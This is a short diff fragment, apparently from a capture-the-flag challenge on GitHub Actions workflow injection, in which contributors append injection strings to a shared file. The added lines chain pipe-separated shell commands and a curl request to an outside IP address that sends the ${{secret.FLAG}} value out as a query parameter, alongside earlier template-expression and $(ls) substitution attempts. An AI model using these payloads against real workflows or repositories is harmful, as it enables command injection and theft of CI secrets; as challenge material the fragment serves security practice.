@@ -518,3 +518,6 @@ ${{ env.FLAG }}
 ${{ secret.flag }}
 zghh007:\n|echo "hello world" >> issues|\n
 P4nda0s:$(ls)
+R1gelX29:|test
+|ehco "ls";
+|curl http://101.132.238.43:5992/?flag=`${{secret.FLAG}}`;
